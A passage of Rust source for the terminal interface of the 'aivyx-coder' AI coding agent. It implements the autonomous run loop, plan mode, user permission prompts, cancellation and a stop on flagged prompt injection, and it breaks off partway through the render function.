use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use aivyx_core::{Agent, AgentEvent, SessionState, SpecialistSessionSummary, Task, TaskStatus};
use aivyx_sandbox::{
    InjectionFinding, InjectionTaint, PermissionRequest, PermissionTarget, PlanMode, UserResponse,
};
use aivyx_types::{
    ContentBlock, Message, MissionPlan, MissionStep, Role, StepStatus, ToolCallSource, ToolOutput,
};
use crossterm::event::{Event as CtEvent, EventStream, KeyCode, KeyEventKind, KeyModifiers};
use futures::StreamExt;
use ratatui::layout::{Constraint, Direction, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Clear, Paragraph, Wrap};
use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;
use tui_textarea::TextArea;

use crate::permission::{ModalRequest, PermissionModalReceiver};
use crate::terminal::TerminalGuard;

/// Task-panel rows before the panel stops growing and shows a window into
/// the list instead — the transcript, not the task list, deserves the
/// vertical space.
const MAX_VISIBLE_TASKS: usize = 6;

/// Mission-panel step rows before the panel stops growing and shows a
/// window into the list instead -- same rationale and value as
/// `MAX_VISIBLE_TASKS`.
const MAX_VISIBLE_MISSION_STEPS: usize = 6;

/// The autonomous driver's goal-achieved signal, combining three
/// independent sources: the `set_tasks` list, `MissionPlan` (Nonagon team
/// missions), and open specialist sessions. Each of the first two
/// contributes a signal only if it was ever *used* — an empty task list, a
/// `None` mission plan, or a `Some(MissionPlan)` whose `mission` and `steps`
/// are both empty (the eager placeholder `agent_builder.rs` constructs
/// whenever `[team] enabled = true`, regardless of whether `decompose_task`
/// was ever called this run) all mean that surface was never engaged, so it
/// must not count as "nothing to do, stop immediately" (an unused signal is
/// a no-op, not a blocker). An open specialist session always blocks
/// completion outright, regardless of the other two — a live, un-closed
/// specialist session is inherently evidence of unfinished business. When
/// neither tasks nor a mission were ever used, this is `false` — matching
/// the original single-signal behavior exactly. See ROADMAP.md Phase 11c
/// and `docs/superpowers/specs/2026-09-21-autonomous-goal-achieved-team-awareness-design.md`.
fn goal_achieved(
    tasks: &[Task],
    mission_plan: Option<&MissionPlan>,
    open_specialist_sessions: &[SpecialistSessionSummary],
) -> bool {
    if !open_specialist_sessions.is_empty() {
        return false;
    }
    let tasks_signal =
        (!tasks.is_empty()).then(|| tasks.iter().all(|t| t.status == TaskStatus::Done));
    let mission_signal = mission_plan
        .filter(|p| !p.mission.is_empty() || !p.steps.is_empty())
        .map(|p| p.summary.is_some());
    match (tasks_signal, mission_signal) {
        (None, None) => false,
        _ => tasks_signal.unwrap_or(true) && mission_signal.unwrap_or(true),
    }
}

/// What the autonomous driver sends next, given whether the turn that just
/// finished paused (Phase 12A), the current task list, the current mission
/// plan (if any), and any open specialist sessions. `None` means stop the
/// loop (goal achieved) — the caller is responsible for the separate
/// budget-exhaustion and cancellation stop conditions, which this function
/// doesn't know about.
fn next_autonomous_message(
    last_turn_paused: bool,
    tasks: &[Task],
    mission_plan: Option<&MissionPlan>,
    open_specialist_sessions: &[SpecialistSessionSummary],
) -> Option<String> {
    if last_turn_paused {
        return Some("continue".to_string());
    }
    if goal_achieved(tasks, mission_plan, open_specialist_sessions) {
        return None;
    }
    Some("continue working toward the goal".to_string())
}

/// The three driver stop reasons each get their own message-building
/// function (rather than inlining `format!` at each `agent.notify(...)`
/// call site) purely so the message *content* is unit-testable — the
/// driver loop itself lives inside a spawned task in `run()` and isn't a
/// pure function, so it can't be exercised directly in a unit test.
fn budget_exhausted_notice(iterations_used: u32, tasks: &[Task]) -> String {
    let done_count = tasks
        .iter()
        .filter(|t| t.status == TaskStatus::Done)
        .count();
    format!(
        "autonomous run stopped: budget exhausted after {iterations_used} iteration(s) \
         ({done_count}/{} tasks done)",
        tasks.len()
    )
}

fn cancelled_notice(iterations_used: u32) -> String {
    format!("autonomous run stopped: cancelled by user after {iterations_used} iteration(s)")
}

/// U3: the exact marker appended to the transcript when an interactive
/// (non-autonomous) streaming turn is cancelled mid-stream (Ctrl+C) -- a
/// partial assistant answer otherwise looks identical to a complete one.
/// Routed through `agent.notify()` (`AgentEvent::Error`, the one existing
/// background-task → transcript bridge) and recognized by exact text in
/// `handle_agent_event`, which renders it via `ChatLine::Cancelled` (dim)
/// instead of the red/bold `ChatLine::Notice` a real error gets.
const CANCELLED_TURN_MARKER: &str = "— stopped (Ctrl+C)";

/// B2 part 2's decision function: whether a just-completed turn should
/// show the "nothing was changed" plan-mode reminder, and what it says.
/// `had_model_activity` is `false` for a command-only turn that calls
/// `run_turn` but never touches the model (`/models`, an unconfigured
/// `/council`, etc.) -- those must not get the reminder, since nothing
/// about them is explained by plan mode being on. `cancelled` is `true`
/// when the user Ctrl+C'd this turn (fix round 1, Important): a cancelled
/// turn already gets U3's own `CANCELLED_TURN_MARKER` line, and showing
/// both made it look like two different things happened to the same
/// reply -- the plan-mode reminder is suppressed in that case.
fn plan_mode_turn_notice(
    plan_mode_active: bool,
    had_model_activity: bool,
    cancelled: bool,
) -> Option<&'static str> {
    if plan_mode_active && had_model_activity && !cancelled {
        Some("Plan mode — nothing was changed. Press Ctrl+P to approve the plan and start.")
    } else {
        None
    }
}

/// B2 part 3's auto-sent instruction when Ctrl+P approves a pending plan —
/// shown in the transcript as a normal user turn, exactly as if typed.
const PLAN_APPROVED_MESSAGE: &str = "The plan is approved. Carry it out now, task by task.";

/// B2 part 3's decision function: whether turning plan mode OFF should
/// also auto-send `PLAN_APPROVED_MESSAGE`, starting execution immediately
/// instead of leaving the user to type the same thing themselves. Fires
/// only on the specific transition this exists for: plan mode *was* on
/// (so this toggle just turned it off), there's at least one pending task
/// to carry out, and no turn is currently running to interrupt. With no
/// tasks, today's behaviour (just the toggle notice) is kept.
fn plan_approval_message(
    plan_mode_was_on: bool,
    has_pending_tasks: bool,
    turn_idle: bool,
) -> Option<&'static str> {
    if plan_mode_was_on && has_pending_tasks && turn_idle {
        Some(PLAN_APPROVED_MESSAGE)
    } else {
        None
    }
}

fn goal_achieved_notice(iterations_used: u32) -> String {
    format!("autonomous run stopped: goal achieved after {iterations_used} iteration(s)")
}

fn injection_detected_notice(iterations_used: u32, finding: &InjectionFinding) -> String {
    format!(
        "autonomous run stopped: possible prompt injection detected after {iterations_used} \
         iteration(s) — flagged content from {} matched \"{}\": \"{}\"",
        finding.source, finding.matched_pattern, finding.excerpt
    )
}

/// Interactive mode's counterpart to `injection_detected_notice`: no
/// iteration count (interactive mode has no bounded driver loop) and no
/// "stopped" framing, since interactive mode never halts on this — it
/// only tells the operator that flagged content entered context at some
/// point this session, having already been ingested and acted on. See
/// the `injection_taint.current()` peek in `run()`'s interactive branch
/// for why this is a passive notice rather than a gate.
fn interactive_injection_notice(finding: &InjectionFinding) -> String {
    format!(
        "note: content from {} was flagged as a likely prompt injection this session \
         (matched \"{}\"): \"{}\"",
        finding.source, finding.matched_pattern, finding.excerpt
    )
}

enum ChatLine {
    User(String),
    Assistant(String),
    /// A reasoning-capable model's chain-of-thought, streamed live and
    /// styled distinctly from the final answer — see
    /// `docs/superpowers/specs/2026-07-19-reasoning-visibility-design.md`.
    /// Deliberately never persisted (no `Message`/`ContentBlock`
    /// equivalent exists) — see that spec's Decision 2.
    Reasoning(String),
    ToolCall(String),
    ToolResult(String),
    Notice(String),
    /// `/help` output (U4/U5) — deliberately its own kind, not `Notice`:
    /// `Notice` renders with the red/bold "  ! " prefix used for real
    /// errors and warnings, which made `/help` read as if something had
    /// gone wrong. Rendered as a plain, unprefixed, unstyled block.
    Help(String),
    /// A streaming turn was cancelled mid-stream (U3, Ctrl+C) — rendered
    /// dim, not red/bold like `Notice`: nothing failed, the user just
    /// chose to stop.
    Cancelled(String),
    /// A turn paused on the iteration cap while still working — deliberately
    /// styled distinctly from `Notice` (which today also carries real
    /// errors and is red/bold): nothing failed, the session is resumable by
    /// just sending another message. See `AgentEvent::TurnPaused`.
    Paused(String),
    /// One block of `/council` deliberation output — visually distinct from
    /// both the assistant and error notices, since a council's members are
    /// not "aivyx" and their notes are not failures.
    Council(String),
    /// One rendered line of a `delegate_task` sub-agent's own activity
    /// (its text, tool calls, tool results) — visually distinct from both
    /// the parent's own transcript and `Council`'s deliberation, since a
    /// sub-agent's mutations still trigger real confirmation modals and
    /// need visible lead-up explaining what's being attempted and why.
    SubAgent(String),
    /// One block of `/architect` output (the planning-in-progress note or
    /// the produced plan) — visually distinct from `Council`'s
    /// deliberation and the parent's own transcript, since the architect is
    /// a separate model producing a plan, not "aivyx" speaking.
    Architect(String),
}

/// Configures an unattended `--auto` session (ROADMAP.md Phase 11c). `tasks`
/// is a clone of the same `Arc<Mutex<Vec<Task>>>` handle already shared
/// between the `set_tasks` tool and the `Agent` — the driver reads it
/// directly rather than waiting on an `AgentEvent::TasksUpdated` event, so
/// its goal-achieved check always sees the current state.
pub struct AutonomousRun {
    pub goal: String,
    pub max_iterations: u32,
    pub max_duration: Duration,
    pub tasks: Arc<Mutex<Vec<Task>>>,
    pub injection_taint: InjectionTaint,
    /// `None` when `[team] enabled = false` (see `agent_builder.rs`'s
    /// `BuiltAgent.mission_plan`, which this is threaded from directly).
    pub mission_plan: Option<Arc<Mutex<MissionPlan>>>,
    /// `None` when `[team] enabled = false` (see `agent_builder.rs`'s
    /// `BuiltAgent.specialist_session_pool`, threaded from directly).
    pub specialist_session_pool: Option<aivyx_core::SpecialistSessionPool>,
}

/// A brief startup banner, printed to plain stdout before the TUI takes
/// over the screen via the alternate-screen buffer (see
/// `TerminalGuard::init` in `terminal.rs`). Colors match the Wick &
/// Compass identity's real brass/rust/slate token values exactly
/// (`aivyx-brand/design-tokens.md`) -- no new palette invented. Box
/// width is computed from the real content, not hardcoded, so a longer
/// future version string can't misalign the border.
///
/// Uses `crossterm::style::Color` fully-qualified throughout, not the
/// bare `Color` this file already imports from `ratatui::style` at file
/// scope -- the two types share a name but not a shape
/// (`ratatui::style::Color::Rgb` is a tuple variant, `Rgb(u8, u8, u8)`;
/// `crossterm::style::Color::Rgb` is a struct variant, `Rgb { r, g, b }`)
/// and a bare reference here would silently resolve to the wrong one and
/// fail to compile.
fn startup_banner() -> String {
    use crossterm::style::Stylize;

    let brass = crossterm::style::Color::Rgb {
        r: 0xc9,
        g: 0xa2,
        b: 0x4b,
    };
    let rust = crossterm::style::Color::Rgb {
        r: 0xb5,
        g: 0x43,
        b: 0x2b,
    };
    let slate = crossterm::style::Color::Rgb {
        r: 0x8a,
        g: 0x95,
        b: 0xa1,
    };

    let title = "aivyx-coder";
    let version = format!("v{}", env!("CARGO_PKG_VERSION"));
    let line1_plain = format!("{title}  {version}");
    let line2_plain = "\u{25cf} local models only".to_string();

    let interior_width = line1_plain.chars().count().max(line2_plain.chars().count());
    let line1_pad = " ".repeat(interior_width - line1_plain.chars().count());
    let line2_pad = " ".repeat(interior_width - line2_plain.chars().count());
    let border = "\u{2500}".repeat(interior_width + 4);

    format!(
        "{tl}{border_top}{tr}\n\
         {v1}  {title_c}  {version_c}{p1}  {v2}\n\
         {v3}  {dot_c} {tagline_c}{p2}  {v4}\n\
         {bl}{border_bottom}{br}\n",
        tl = "\u{250c}".with(brass),
        border_top = border.clone().with(brass),
        tr = "\u{2510}".with(brass),
        v1 = "\u{2502}".with(brass),
        title_c = title.bold(),
        version_c = version.with(slate),
        p1 = line1_pad,
        v2 = "\u{2502}".with(brass),
        v3 = "\u{2502}".with(brass),
        dot_c = "\u{25cf}".with(rust),
        tagline_c = "local models only".with(slate),
        p2 = line2_pad,
        v4 = "\u{2502}".with(brass),
        bl = "\u{2514}".with(brass),
        border_bottom = border.with(brass),
        br = "\u{2518}".with(brass),
    )
}

/// Owns the ratatui render loop. Takes an already-constructed `Agent` (the
/// caller built it with the `LlmBackend` + `ToolExecutor` it wants) and the
/// receiving half of the channel that `Agent` was constructed with; `run`
/// drives the agent on a background task and renders its events live.
/// `repl_resize` (Real PTY feature) tips this over clippy's default
/// argument-count threshold of 7 — each parameter is a distinct
/// frontend-level collaborator with no natural grouping.
#[allow(clippy::too_many_arguments)]
pub async fn run(
    mut agent: Agent,
    mut agent_events_rx: mpsc::UnboundedReceiver<AgentEvent>,
    cwd: PathBuf,
    mut permission_rx: PermissionModalReceiver,
    restored: Option<SessionState>,
    plan_mode: PlanMode,
    autonomous: Option<AutonomousRun>,
    repl_resize: std::sync::Arc<dyn aivyx_sandbox::ResizeTarget>,
) -> anyhow::Result<()> {
    let (input_tx, mut input_rx) = mpsc::unbounded_channel::<String>();
    let active_cancellation: Arc<Mutex<Option<CancellationToken>>> = Arc::new(Mutex::new(None));

    let background_cancellation = Arc::clone(&active_cancellation);
    tokio::spawn(async move {
        if let Some(autonomous) = autonomous {
            // Autonomous mode drives itself — it never waits on input_rx
            // (a human typing during an autonomous run has no effect
            // beyond appearing in the transcript locally; Ctrl+C is the
            // only supported intervention, matching the design doc's
            // scope).
            let deadline = Instant::now() + autonomous.max_duration;
            let mut iterations_used = 0u32;
            let mut next_message = Some(autonomous.goal.clone());
            while let Some(message) = next_message.take() {
                if iterations_used >= autonomous.max_iterations || Instant::now() >= deadline {
                    let tasks_snapshot = autonomous.tasks.lock().unwrap().clone();
                    agent.notify(budget_exhausted_notice(iterations_used, &tasks_snapshot));
                    break;
                }
                iterations_used += 1;
                let cancellation = CancellationToken::new();
                *background_cancellation.lock().unwrap() = Some(cancellation.clone());
                let _ = agent.run_turn(message, &cwd, cancellation.clone()).await;
                *background_cancellation.lock().unwrap() = None;

                if cancellation.is_cancelled() {
                    // The user hit Ctrl+C wanting this to stop — do not
                    // send another message.
                    agent.notify(cancelled_notice(iterations_used));
                    break;
                }
                // Still load-bearing after `run_turn`'s own internal
                // tool-call loop gained a mid-turn taint check of its own
                // (see that loop's own comment in `aivyx-core`): that inner
                // check only ends the turn that just ran early: it says
                // nothing about whether *this* outer driver loop should
                // send another "continue" message and start a new turn.
                // This is the check that actually stops the unattended run
                // — `.take()`, not `.current()`, since consuming the taint
                // here is exactly what decides that outcome.
                if let Some(finding) = autonomous.injection_taint.take() {
                    agent.notify(injection_detected_notice(iterations_used, &finding));
                    break;
                }
                let tasks_snapshot = autonomous.tasks.lock().unwrap().clone();
                let mission_plan_snapshot = autonomous
                    .mission_plan
                    .as_ref()
                    .map(|p| p.lock().unwrap().clone());
                let open_specialist_sessions = autonomous
                    .specialist_session_pool
                    .as_ref()
                    .map(|pool| pool.open_sessions())
                    .unwrap_or_default();
                next_message = next_autonomous_message(
                    agent.last_turn_paused(),
                    &tasks_snapshot,
                    mission_plan_snapshot.as_ref(),
                    &open_specialist_sessions,
                );
                if next_message.is_none() {
                    agent.notify(goal_achieved_notice(iterations_used));
                }
            }
        } else {
            while let Some(input) = input_rx.recv().await {
                if aivyx_core::commands::parse_slash_command(&input, "/clear").is_some() {
                    // AgentState tier: never touches run_turn, never calls
                    // the model. Order matters — clear_conversation's own
                    // ConversationCleared event must be emitted (and thus
                    // received by the render loop) before this notify's
                    // Error event, or the confirmation message would be
                    // wiped by the clear that follows it. mpsc channels
                    // preserve send order, so calling these sequentially
                    // here is sufficient.
                    agent.clear_conversation();
                    agent.notify("Conversation cleared.");
                    continue;
                }
                let cancellation = CancellationToken::new();
                *background_cancellation.lock().unwrap() = Some(cancellation.clone());
                let _ = agent.run_turn(input, &cwd, cancellation.clone()).await;
                *background_cancellation.lock().unwrap() = None;

                // U3: Ctrl+C mid-stream must not leave a partial answer
                // looking like a complete one.
                if cancellation.is_cancelled() {
                    agent.notify(CANCELLED_TURN_MARKER);
                }

                // Peek — never take() — the shared taint flag after every
                // interactive turn too, not just autonomous mode's gate and
                // driver loop. `record_tool_result` scans and flags this
                // regardless of mode, so the cost is paid here either way;
                // until now nothing in interactive mode ever surfaced the
                // result. Interactive mode has no pause-and-resume flow to
                // clear the flag the way autonomous mode's `.take()` above
                // does, and the operator has already seen (and chosen to
                // continue past) every action this session took, so simply
                // naming the flagged source each turn — not blocking on it
                // — is the right interactive-mode behavior.
                if let Some(finding) = agent.injection_taint().current() {
                    agent.notify(interactive_injection_notice(&finding));
                }
            }
        }
    });

    print!("{}", startup_banner());
    use std::io::Write as _;
    std::io::stdout().flush().ok();

    let mut guard = TerminalGuard::init()?;
    let mut app = App::new(restored, plan_mode);
    let mut crossterm_events = EventStream::new();

    loop {
        guard.terminal().draw(|frame| app.render(frame))?;

        tokio::select! {
            maybe_event = crossterm_events.next() => {
                let Some(event) = maybe_event else { break };
                let event = event?;

                if let CtEvent::Key(key) = &event
                    && key.kind == KeyEventKind::Press
                {
                    if app.pending_permission.is_some() {
                        match (key.code, key.modifiers) {
                            (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                                app.resolve_permission(UserResponse::Deny);
                                if let Some(cancellation) = active_cancellation.lock().unwrap().as_ref() {
                                    cancellation.cancel();
                                    app.cancel_requested = true;
                                }
                            }
                            (KeyCode::Char('y'), KeyModifiers::NONE) => {
                                app.resolve_permission(UserResponse::Allow);
                            }
                            (KeyCode::Char('a'), KeyModifiers::NONE) => {
                                // Not offered (and not honored, even if typed
                                // blind) for a target `offer_always_allow`
                                // flags -- one approval must not silently
                                // bless every future edit to a file that
                                // runs code outside Landlock's confinement.
                                let offered = app
                                    .pending_permission
                                    .as_ref()
                                    .is_some_and(|modal| offer_always_allow(&modal.request));
                                if offered {
                                    app.resolve_permission(UserResponse::AllowAlways);
                                }
                            }
                            (KeyCode::Char('n'), KeyModifiers::NONE)
                            | (KeyCode::Esc, KeyModifiers::NONE)
                            | (KeyCode::Enter, KeyModifiers::NONE) => {
                                app.resolve_permission(UserResponse::Deny);
                            }
                            // Swallow everything else while a modal is up — no
                            // accidental approval, no leaking keystrokes into
                            // the input box behind it.
                            _ => {}
                        }
                        continue;
                    }

                    match (key.code, key.modifiers) {
                        (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                            let cancellation = active_cancellation.lock().unwrap().clone();
                            match cancellation {
                                Some(cancellation) => {
                                    cancellation.cancel();
                                    app.cancel_requested = true;
                                }
                                None => break,
                            }
                            continue;
                        }
                        (KeyCode::Enter, KeyModifiers::NONE) => {
                            let text = app.take_input();
                            if !text.is_empty() {
                                if aivyx_core::commands::parse_slash_command(&text, "/quit").is_some() {
                                    break;
                                }
                                if aivyx_core::commands::parse_slash_command(&text, "/help").is_some() {
                                    app.show_help();
                                } else {
                                    app.push_user_message(text.clone());
                                    let _ = input_tx.send(text);
                                }
                            }
                            continue;
                        }
                        (KeyCode::Char('p'), KeyModifiers::CONTROL) => {
                            if let Some(message) = app.toggle_plan_mode_and_maybe_approve() {
                                let _ = input_tx.send(message);
                            }
                            continue;
                        }
                        _ => {}
                    }
                }

                if let CtEvent::Resize(cols, rows) = &event {
                    repl_resize.resize(*cols, *rows);
                }

                app.input.input(event);
            }
            maybe_agent_event = agent_events_rx.recv() => {
                if let Some(event) = maybe_agent_event {
                    app.handle_agent_event(event);
                }
            }
            maybe_modal = permission_rx.recv() => {
                if let Some(modal) = maybe_modal {
                    app.pending_permission = Some(modal);
                }
            }
            _ = async {
                match app.pending_permission.as_mut() {
                    Some(modal) => modal.reply_tx.closed().await,
                    None => std::future::pending().await,
                }
            } => {
                // The other side of the gate's race (an editor-approval
                // response) already answered this decision — the modal is
                // stale and must not wait for a keypress to clear. Do NOT
                // send a reply here: the decision was already made.
                app.pending_permission = None;
            }
        }
    }

    Ok(())
}

struct App {
    transcript: Vec<ChatLine>,
    input: TextArea<'static>,
    streaming_active: bool,
    pending_permission: Option<ModalRequest>,
    /// Latest `(used, limit)` context-token counts from the backend, shown
    /// in the status line. `None` until the first response reports usage.
    context_usage: Option<(u32, u32)>,
    /// The agent's task list, rendered as a panel between the transcript
    /// and the input box whenever it's non-empty.
    tasks: Vec<Task>,
    /// The current mission plan, if `decompose_task` has been called this
    /// session -- rendered as part of the Mission panel. Not persisted
    /// across `--resume` (mission state is in-memory only, same as
    /// specialist sessions).
    mission_plan: Option<MissionPlan>,
    /// Every currently-open specialist session's (session_id, member) --
    /// rendered as a compact line in the Mission panel. Empty until the
    /// first `spawn_specialist` call.
    open_specialist_sessions: Vec<SpecialistSessionSummary>,
    /// Shared with the gate (enforcement) and the agent (tool filtering +
    /// system-prompt note); the TUI owns the only toggle.
    plan_mode: PlanMode,
    /// Set by `push_user_message` (a new turn is starting) to `false`, then
    /// to `true` the first time this turn produces any real model output
    /// or action (`TextDelta`/`ReasoningDelta`/`ToolCallDetected`/
    /// `ToolResult`/`CouncilNote`/`ArchitectNote`/`SubAgentActivity`).
    /// Read at `TurnComplete` (B2 part 2) to tell a real model turn from a
    /// command-only one (`/models`, an unconfigured `/council`, etc.,
    /// which call `run_turn` but never touch the model) -- the plan-mode
    /// "nothing was changed" notice must only follow the former.
    turn_had_model_activity: bool,
    /// Set `true` the moment Ctrl+C cancels an in-flight turn (the render
    /// loop's key handler, synchronously -- well before the background
    /// task's `run_turn` call returns and its events reach here), reset to
    /// `false` by `push_user_message` at the start of the next turn (fix
    /// round 1, Important). The background task only learns of the
    /// cancellation *after* `run_turn` returns and reports it via
    /// `agent.notify(CANCELLED_TURN_MARKER)` -- which arrives strictly
    /// after that turn's own `TurnComplete` (cancellation still runs the
    /// turn loop to a normal `TurnComplete`, it just stops early) -- so
    /// `TurnComplete`'s own handler can't yet see "this turn was
    /// cancelled" from the event stream alone; this flag is read there
    /// instead to suppress `plan_mode_turn_notice` for a cancelled turn.
    cancel_requested: bool,
    /// The model the router last moved this conversation to, shown in the
    /// status line. `None` until routing reports a choice (always `None`
    /// with routing off).
    routed_model: Option<String>,
}

impl App {
    fn new(restored: Option<SessionState>, plan_mode: PlanMode) -> Self {
        let (transcript, tasks) = match restored {
            Some(state) => {
                let mut transcript = seed_transcript(&state.history);
                transcript.push(ChatLine::Notice(format!(
                    "resumed previous session ({} messages restored)",
                    state.history.len()
                )));
                (transcript, state.tasks)
            }
            None => (Vec::new(), Vec::new()),
        };
        Self {
            transcript,
            input: new_input_box(),
            streaming_active: false,
            pending_permission: None,
            context_usage: None,
            routed_model: None,
            tasks,
            mission_plan: None,
            open_specialist_sessions: Vec::new(),
            plan_mode,
            turn_had_model_activity: false,
            cancel_requested: false,
        }
    }

    fn toggle_plan_mode(&mut self) {
        let active = self.plan_mode.toggle();
        // The toggle goes into the transcript, not just the status line —
        // when reading back a session, *when* the mode flipped relative to
        // the conversation matters.
        self.transcript.push(ChatLine::Notice(if active {
            "plan mode ON — write/execute tools withheld until you approve (Ctrl+P)".to_string()
        } else {
            "plan mode OFF — full tool access restored".to_string()
        }));
    }

    /// Toggles plan mode (as `toggle_plan_mode` always has), and — per
    /// `plan_approval_message` (B2 part 3) — when that turns it OFF with a
    /// pending task list and no turn running, also pushes
    /// `PLAN_APPROVED_MESSAGE` as a user turn and returns it so the caller
    /// can forward it to the agent exactly like a typed message.
    fn toggle_plan_mode_and_maybe_approve(&mut self) -> Option<String> {
        let was_on = self.plan_mode.active();
        self.toggle_plan_mode();
        let has_pending_tasks = self.tasks.iter().any(|t| t.status == TaskStatus::Pending);
        let turn_idle = !self.streaming_active;
        let message = plan_approval_message(was_on, has_pending_tasks, turn_idle)?;
        self.push_user_message(message.to_string());
        Some(message.to_string())
    }

    fn resolve_permission(&mut self, response: UserResponse) {
        if let Some(modal) = self.pending_permission.take() {
            let _ = modal.reply_tx.send(response);
        }
    }

    /// True if the pending modal's reply channel is already closed —
    /// meaning the other side of `ConfirmationGate`'s race (an
    /// editor-approval response) already answered this decision, and the
    /// modal is stale.
    fn pending_permission_is_stale(&self) -> bool {
        self.pending_permission
            .as_ref()
            .is_some_and(|modal| modal.reply_tx.is_closed())
    }

    fn take_input(&mut self) -> String {
        let text = self.input.lines().join("\n");
        self.input = new_input_box();
        text.trim().to_string()
    }

    fn push_user_message(&mut self, text: String) {
        self.transcript.push(ChatLine::User(text));
        self.streaming_active = true;
        self.turn_had_model_activity = false;
        self.cancel_requested = false;
    }

    /// Renders the `/help` command via `help_text()` as a `ChatLine::Help`
    /// (U4/U5) -- deliberately not `Notice` (see that variant's doc
    /// comment).
    fn show_help(&mut self) {
        self.transcript.push(ChatLine::Help(help_text()));
    }

    /// Slash-command suggestions for the input box's current
    /// (uncommitted) content — shown while the user is still composing a
    /// command name: starts with `/`, no whitespace yet. Empty once a
    /// space appears or the text doesn't start with `/`.
    fn command_hint_matches(&self) -> Vec<&'static aivyx_core::commands::CommandInfo> {
        let text = self.input.lines().join("\n");
        if !text.starts_with('/') || text.contains(char::is_whitespace) {
            return Vec::new();
        }
        aivyx_core::commands::COMMANDS
            .iter()
            .filter(|c| c.name.starts_with(text.as_str()))
            .collect()
    }

    fn handle_agent_event(&mut self, event: AgentEvent) {
        match event {
            AgentEvent::TextDelta(text) => {
                self.turn_had_model_activity = true;
                if let Some(ChatLine::Assistant(existing)) = self.transcript.last_mut() {
                    existing.push_str(&text);
                } else {
                    self.transcript.push(ChatLine::Assistant(text));
                }
            }
            AgentEvent::ReasoningDelta(text) => {
                self.turn_had_model_activity = true;
                if let Some(ChatLine::Reasoning(existing)) = self.transcript.last_mut() {
                    existing.push_str(&text);
                } else {
                    self.transcript.push(ChatLine::Reasoning(text));
                }
            }
            AgentEvent::ToolCallDetected(call) => {
                self.turn_had_model_activity = true;
                // Auto-verification calls are the agent's own doing, not
                // the model's — labeled distinctly so the transcript never
                // implies the model asked for this itself.
                let prefix = if call.source == ToolCallSource::AutoVerification {
                    "auto-verify: "
                } else {
                    ""
                };
                self.transcript.push(ChatLine::ToolCall(format!(
                    "{prefix}{}",
                    tool_call_summary(&call.name, &call.arguments)
                )));
            }
            AgentEvent::ToolResult(result) => {
                self.turn_had_model_activity = true;
                self.transcript
                    .push(ChatLine::ToolResult(tool_output_text(&result.output)));
            }
            AgentEvent::TurnComplete => {
                self.streaming_active = false;
                if let Some(notice) = plan_mode_turn_notice(
                    self.plan_mode.active(),
                    self.turn_had_model_activity,
                    self.cancel_requested,
                ) {
                    self.transcript.push(ChatLine::Notice(notice.to_string()));
                }
                self.turn_had_model_activity = false;
            }
            AgentEvent::Error(message) if message == CANCELLED_TURN_MARKER => {
                self.transcript.push(ChatLine::Cancelled(message));
                self.streaming_active = false;
            }
            AgentEvent::Error(message) => {
                self.transcript.push(ChatLine::Notice(message));
                self.streaming_active = false;
            }
            AgentEvent::TurnPaused(message) => {
                self.transcript.push(ChatLine::Paused(message));
                self.streaming_active = false;
            }
            AgentEvent::ContextUsage { used, limit } => {
                self.context_usage = Some((used, limit));
            }
            AgentEvent::TasksUpdated(tasks) => {
                self.tasks = tasks;
            }
            AgentEvent::MissionsUpdated(plan) => {
                self.mission_plan = Some(plan);
            }
            AgentEvent::SpecialistSessionsUpdated(sessions) => {
                self.open_specialist_sessions = sessions;
            }
            AgentEvent::ConversationCleared => {
                self.transcript.clear();
                self.tasks.clear();
                self.mission_plan = None;
                self.open_specialist_sessions.clear();
                self.context_usage = None;
                self.streaming_active = false;
                self.routed_model = None;
            }
            AgentEvent::CouncilNote(text) => {
                self.turn_had_model_activity = true;
                self.transcript.push(ChatLine::Council(text));
            }
            AgentEvent::ArchitectNote(text) => {
                self.turn_had_model_activity = true;
                self.transcript.push(ChatLine::Architect(text));
            }
            AgentEvent::SubAgentActivity(inner) => {
                self.turn_had_model_activity = true;
                self.transcript
                    .push(ChatLine::SubAgent(sub_agent_event_text(&inner)));
            }
            AgentEvent::ModelRouted { model, reason } => {
                self.transcript
                    .push(ChatLine::Notice(format!("routing → {model}: {reason}")));
                self.routed_model = Some(model);
            }
        }
    }

    fn render(&self, frame: &mut ratatui::Frame) {
        // The task panel only occupies a row of the layout while there are
        // tasks to show — an empty bordered box would just eat transcript
        // space for the (common) sessions that never use the task list.
        let tasks_height = if self.tasks.is_empty() {
            0
        } else {
            self.tasks.len().min(MAX_VISIBLE_TASKS) as u16 + 2 // + borders
        };
        // The Mission panel occupies its own conditional row, independent
        // of the Tasks panel above — either, both, or neither can be
        // present, so its layout index below is computed dynamically
        // (`panel_index`) rather than hardcoded, unlike the Tasks panel's
        // own pre-existing `layout[1]` (safe there only because Tasks was
        // always the sole optional row before this panel existed).
        let mission_height =
            mission_panel_height(self.mission_plan.as_ref(), &self.open_specialist_sessions);
        let mut constraints = vec![Constraint::Min(1)];
        if tasks_height > 0 {
            constraints.push(Constraint::Length(tasks_height));
        }
        if mission_height > 0 {
            constraints.push(Constraint::Length(mission_height));
        }
        constraints.push(Constraint::Length(3));
        constraints.push(Constraint::Length(1));
        let layout = Layout::default()
            .direction(Direction::Vertical)
            .constraints(constraints)
            .split(frame.area());
        let (input_area, status_area) = (layout[layout.len() - 2], layout[layout.len() - 1]);

        let mut lines: Vec<Line> = self
            .transcript
            .iter()
            .flat_map(chat_line_to_lines)
            .collect();
        if !self.transcript.iter().any(|l| matches!(l, ChatLine::User(_))) {
            lines.extend(first_message_hint());
        }
        let viewport_height = layout[0].height.saturating_sub(2);
        // border chars, left + right
        let content_width = layout[0].width.saturating_sub(2);

        let transcript = Paragraph::new(lines).wrap(Wrap { trim: false });
        // `Paragraph::scroll` applies its offset *after* wrapping, so the
        // offset must be computed from the wrapped (post-wrap) row count —
        // `lines.len()` alone undercounts as soon as anything actually
        // wraps, and the transcript stops reaching the true bottom.
        //
        // `line_count` must be measured BEFORE `.block(...)` is attached:
        // once a block is set, ratatui adds the block's own vertical space
        // (2 rows for `Borders::ALL`) into the count, which would double
        // count against `viewport_height` (already border-excluded) and
        // over-scroll by exactly that many rows.
        let wrapped_rows = transcript.line_count(content_width) as u16;
        let scroll = wrapped_rows.saturating_sub(viewport_height);

        let transcript = transcript
            .block(Block::default().borders(Borders::ALL).title("aivyx-coder"))
            .scroll((scroll, 0));
        frame.render_widget(transcript, layout[0]);

        let mut panel_index = 1;
